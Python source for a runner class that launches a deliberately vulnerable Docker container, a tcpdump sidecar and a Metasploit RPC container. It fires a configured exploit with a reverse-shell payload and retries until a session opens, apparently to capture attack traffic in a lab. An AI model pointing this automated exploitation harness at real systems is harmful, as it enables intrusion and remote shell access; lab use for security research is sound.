from __future__ import annotations

import logging
import secrets
import time

import docker
import docker.models.containers
from rich.console import Console
from runners.base import BaseRunner
from utils import safe_stop_remove

logger = logging.getLogger(__name__)
console = Console(stderr=True)


class DockerMsfRpc(BaseRunner):
    """Runner for exploiting a single vulnerable Docker container via Metasploit RPC."""

    def __init__(self, docker_client: docker.DockerClient, name: str = "target",
                 network_name: str = "set_framework_net", volume_name: str = "set_logs",
                 target_image: str = "", msf_exploit: str = "", msf_options: str = "", delay: int = 0,
                 msf_image: str = "metasploitframework/metasploit-framework:6.2.33",
                 prefix: str = "") -> None:
        """Initialize with the target image, exploit module, and optional delay."""
        super().__init__(docker_client, network_name, volume_name, prefix=prefix)
        self.target = None
        self.attack = None
        self.tcpdump = None
        self.name = name
        self.target_name = self._prefixed(name)
        self.target_image = target_image
        self.msf_exploit = msf_exploit
        self.delay = delay
        self.msf_options = msf_options
        self.msf_image = msf_image
        self.rpc_password = secrets.token_hex(8)
        self.rpc_port = 55552
        self.rpc_client = None

    def target_setup(self) -> None:
        """Start the vulnerable target container from the configured image."""
        logger.debug("Starting vulnerable target %s", self.name)
        dk_target = self.client.containers.run(self.target_image,
                                               detach=True, name=self.target_name,
                                               network=self.network)
        self.target = dk_target
        time.sleep(self.delay)

    def target_cleanup(self) -> None:
        """Stop and remove the target and its tcpdump sidecar."""
        if self.tcpdump:
            self.tcpdump_cleanup()
        safe_stop_remove(self.target, label=self.target_name)

    def tcpdump_setup(self) -> None:
        """Start a tcpdump container attached to the target's network."""
        self.tcpdump = self._run_tcpdump_container(self.name, self.target_name)

    def tcpdump_cleanup(self) -> None:
        """Stop and remove the tcpdump container."""
        safe_stop_remove(self.tcpdump, label="%s-tcpdump" % self.target_name)

    def attack_setup(self) -> None:
        """Start the Metasploit attack container with msfrpcd and connect via RPC."""
        logger.debug("Starting RPC attack system for %s", self.target_name)
        cmd = ["./msfrpcd", "-P", self.rpc_password, "-S", "-f", "-a", "0.0.0.0",
               "-p", str(self.rpc_port)]
        dk_attack = self.client.containers.run(
            self.msf_image,
            command=cmd,
            detach=True,
            name="%s-attack" % self.target_name,
            network=self.network,
            tty=True,
        )
        self.attack = dk_attack
        self.rpc_client = self._wait_for_msfrpc(dk_attack, self.rpc_password, port=self.rpc_port)

    def attack_cleanup(self) -> None:
        """Stop and remove the Metasploit attack container."""
        self.rpc_client = None
        safe_stop_remove(self.attack, label="%s-attack" % self.target_name)

    @staticmethod
    def _set_module_option(module, key, value):
        """Set an option on a module, falling back to _runopts for payload options.

        The RPC module's __setitem__ raises KeyError for options not defined on
        the exploit module (e.g. LHOST, LPORT which are payload options).  These
        still need to land in _runopts so that execute() forwards them in the
        RPC call.
        """
        if key in module.options:
            module[key] = value
        else:
            module._runopts[key] = value

    def exploit(self) -> None:
        """Execute the configured exploit via the Metasploit RPC API."""
        module = self.rpc_client.modules.use('exploit', self.msf_exploit)

        # Core options — use helper to handle exploit vs payload options
        self._set_module_option(module, 'RHOSTS', self.target_name)
        self._set_module_option(module, 'LHOST', "%s-attack" % self.target_name)
        self._set_module_option(module, 'ForceExploit', True)
        self._set_module_option(module, 'AutoCheck', False)

        # Parse and apply user-provided options
        parsed = self._parse_msf_options(self.msf_options)
        payload = parsed.pop('PAYLOAD', None)
        for key, value in parsed.items():
            self._set_module_option(module, key, value)

        # A payload MUST be provided to execute(), otherwise pymetasploit3
        # sets DisablePayloadHandler=True and no handler listens for the
        # reverse connection.  Auto-select the first compatible payload
        # when the user hasn't specified one (mirrors msfconsole behaviour).
        if payload is None:
            compatible = module.payloads
            if compatible:
                payload = compatible[0]

        self._last_payload = payload
        result = module.execute(payload=payload)
        self._last_job_id = result.get('job_id')

    def exploit_success(self, pattern: str = "4444") -> bool:
        """Check if the exploit established a session via RPC session list."""
        try:
            sessions = self.rpc_client.sessions.list
            return bool(sessions)
        except Exception:
            return False

    def exploit_until_success(self, status_delay: int = 3, status_checks: int = 7, tries: int = 4) -> bool:
        """Repeatedly run the exploit until an RPC session is established."""
        success = False
        with console.status(f"[bold]Exploiting {self.target_name} (RPC)...[/bold]"):
            for i in range(tries):
                self.exploit()
                for j in range(status_checks):
                    if self.exploit_success(pattern=self.exploit_success_pattern):
                        success = True
                        break
                    time.sleep(status_delay)
                if success:
                    break
        if success:
            logger.info("Exploit of %s success (RPC session established)", self.target_name)
        else:
            logger.warning("Exploit failed or status unknown (RPC)")
        return success

    def _get_target_container(self) -> docker.models.containers.Container:
        """Return the target container instance."""
        return self.target
